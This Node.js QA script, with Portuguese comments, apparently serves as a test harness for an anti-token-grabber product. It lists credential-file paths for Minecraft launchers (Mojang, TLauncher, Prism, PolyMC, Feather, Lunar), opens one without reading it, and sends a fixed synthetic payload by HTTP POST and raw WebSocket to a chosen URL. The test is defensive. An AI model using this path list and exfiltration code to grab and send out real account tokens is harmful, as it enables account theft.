// Tester de exfiltração do AntiGrabber — ferramenta de QA, NÃO é o produto.
//
// Simula o passo observável de um grabber de conta SEM ser um stealer: ABRE um arquivo de
// conta de launcher (só o handle, pra o ETW ver a leitura) e NÃO lê byte nenhum do token;
// depois manda um payload SINTÉTICO FIXO por HTTP POST e por WebSocket. Nunca extrai,
// decodifica ou transmite credencial real.
//
// Dois usos (ver README):
//   Serviço OFF (ver payload):   node exfil-test.js --url http://localhost:3000/exfil --ws ws://localhost:3000
//   Serviço ON  (ver bloqueio):  node exfil-test.js --url https://example.com/
//
// Alvo HTTPS/443 bloqueado (conexão não sai) = PASS. Rodar como `node` deixa o processo
// como node.exe (code host) — mesma classe do javaw de um mod.

const http = require("http");
const https = require("https");
const net = require("net");
const tls = require("tls");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");
const path = require("path");

const PAYLOAD = "TEST_PAYLOAD_NAO_E_TOKEN_REAL|" + new Date().toISOString();
const WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11";

// Aceita --chave=valor e --chave valor.
function parseArgs(argv) {
  const out = {};
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (!a.startsWith("--")) continue;
    const eq = a.indexOf("=");
    if (eq > 0) out[a.slice(2, eq)] = a.slice(eq + 1);
    else if (i + 1 < argv.length && !argv[i + 1].startsWith("--")) out[a.slice(2)] = argv[++i];
    else out[a.slice(2)] = true;
  }
  return out;
}

const args = parseArgs(process.argv.slice(2));
const url = args.url || "https://example.com/";
const wsUrl = args.ws || deriveWs(url);
const timeout = Number(args.timeout || 8000);

function deriveWs(httpUrl) {
  try {
    const u = new URL(httpUrl);
    return (u.protocol === "https:" ? "wss://" : "ws://") + u.host;
  } catch {
    return null;
  }
}

// Arquivos de conta dos launchers (perfil do usuário atual). O --account força um caminho.
function findAccountFile() {
  if (args.account) return fs.existsSync(args.account) ? args.account : null;
  const appData = process.env.APPDATA || path.join(os.homedir(), "AppData", "Roaming");
  const home = os.homedir();
  const candidates = [
    [path.join(appData, ".minecraft"), /^launcher_accounts.*\.json$/i],
    [path.join(appData, ".minecraft"), /^launcher_msa_credentials.*/i],
    [path.join(appData, ".minecraft"), /^TlauncherProfiles\.json$/i],
    [path.join(appData, "PrismLauncher"), /^accounts\.json$/i],
    [path.join(appData, "PolyMC"), /^accounts\.json$/i],
    [path.join(appData, ".feather"), /^accounts\.json$/i],
    [path.join(home, ".lunarclient", "settings", "game"), /^accounts\.json$/i],
  ];
  for (const [dir, rx] of candidates) {
    try {
      const hit = fs.readdirSync(dir).find((f) => rx.test(f));
      if (hit) return path.join(dir, hit);
    } catch {}
  }
  return null;
}

// Abre o arquivo de conta e fecha SEM LER — só pra o ETW registrar a leitura por este PID.
function touchAccountFile(file) {
  const fd = fs.openSync(file, "r");
  fs.closeSync(fd);
}

function sendHttp() {
  return new Promise((resolve) => {
    let u;
    try {
      u = new URL(url);
    } catch {
      return resolve({ vector: "HTTP", status: "erro", detail: "URL inválida" });
    }
    const lib = u.protocol === "https:" ? https : http;
    const req = lib.request(
      url,
      { method: "POST", timeout, headers: { "content-type": "text/plain", "content-length": Buffer.byteLength(PAYLOAD) } },
      (res) => {
        res.resume();
        resolve({ vector: "HTTP", status: "enviou", detail: `resposta HTTP ${res.statusCode}` });
      }
    );
    req.on("timeout", () => req.destroy(new Error("timeout")));
    req.on("error", (e) => resolve({ vector: "HTTP", status: "bloqueou", detail: `${e.code || e.message}` }));
    req.end(PAYLOAD);
  });
}

// Cliente WebSocket cru sobre net/tls: handshake, um frame de texto mascarado, fecha.
function sendWs() {
  return new Promise((resolve) => {
    let u;
    try {
      u = new URL(wsUrl);
    } catch {
      return resolve({ vector: "WS", status: "erro", detail: "ws URL inválida" });
    }
    const secure = u.protocol === "wss:";
    const port = Number(u.port) || (secure ? 443 : 80);
    const key = crypto.randomBytes(16).toString("base64");
    const done = (r) => {
      try {
        sock.destroy();
      } catch {}
      resolve(r);
    };
    const opts = { host: u.hostname, port, timeout, servername: u.hostname };
    const sock = secure ? tls.connect(opts) : net.connect(opts);
    const onReady = () => {
      sock.write(
        `GET ${u.pathname || "/"} HTTP/1.1\r\nHost: ${u.host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n` +
          `Sec-WebSocket-Key: ${key}\r\nSec-WebSocket-Version: 13\r\n\r\n`
      );
    };
    sock.once(secure ? "secureConnect" : "connect", onReady);
    sock.setTimeout(timeout);
    let buf = Buffer.alloc(0);
    sock.on("data", (chunk) => {
      buf = Buffer.concat([buf, chunk]);
      const sep = buf.indexOf("\r\n\r\n");
      if (sep < 0) return;
      const head = buf.toString("ascii", 0, sep);
      // Conectou (TLS ok) mas sem 101: destino não é WebSocket — passou pela REDE.
      // Só é bloqueio quando a conexão nem completa (ver handlers de error/timeout).
      if (!/101/.test(head.split("\r\n")[0]))
        return done({ vector: "WS", status: "enviou", detail: "conectou; destino não é WebSocket (sem 101)" });
      sock.write(maskedTextFrame(PAYLOAD));
      sock.write(maskedCloseFrame());
      done({ vector: "WS", status: "enviou", detail: "upgrade 101, texto enviado" });
    });
    sock.on("timeout", () => done({ vector: "WS", status: "bloqueou", detail: "timeout" }));
    sock.on("error", (e) => done({ vector: "WS", status: "bloqueou", detail: `${e.code || e.message}` }));
  });
}

function maskedTextFrame(text) {
  const payload = Buffer.from(text, "utf8");
  const mask = crypto.randomBytes(4);
  const masked = Buffer.alloc(payload.length);
  for (let i = 0; i < payload.length; i++) masked[i] = payload[i] ^ mask[i & 3];
  const len = payload.length; // teste manda < 126 bytes
  return Buffer.concat([Buffer.from([0x81, 0x80 | len]), mask, masked]);
}

function maskedCloseFrame() {
  const mask = crypto.randomBytes(4);
  return Buffer.concat([Buffer.from([0x88, 0x80]), mask]);
}

(async () => {
  console.log("=== AntiGrabber exfil-test (QA, payload sintético) ===");
  console.log(`Payload: ${JSON.stringify(PAYLOAD)}`);
  const file = findAccountFile();
  if (file) {
    try {
      touchAccountFile(file);
      console.log(`Arquivo de conta aberto (sem ler conteúdo): ${file}`);
    } catch (e) {
      console.log(`Não foi possível abrir ${file}: ${e.message}`);
    }
  } else {
    console.log("Nenhum arquivo de conta de launcher encontrado — passe --account=<caminho>.");
    console.log("Sem isso, o caminho 'leu conta → bloqueia qualquer domínio' não é exercitado.");
  }

  console.log(`HTTP  -> ${url}`);
  console.log(`WS    -> ${wsUrl}`);
  const results = [await sendHttp(), await sendWs()];
  for (const r of results) console.log(`[${r.vector}] ${r.status.toUpperCase()} — ${r.detail}`);

  const external = /^https:/i.test(url);
  const blocked = results.every((r) => r.status === "bloqueou");
  if (external) {
    console.log(blocked ? "PASS — alvo HTTPS/443 bloqueado nos dois vetores." : "FAIL — alvo HTTPS/443 não foi totalmente bloqueado (serviço ligado?).");
    process.exit(blocked ? 0 : 1);
  } else {
    const sent = results.some((r) => r.status === "enviou");
    console.log(sent ? "OK — ferramenta enviou (confira o catcher)." : "Nada enviou — catcher no ar?");
    process.exit(0);
  }
})();
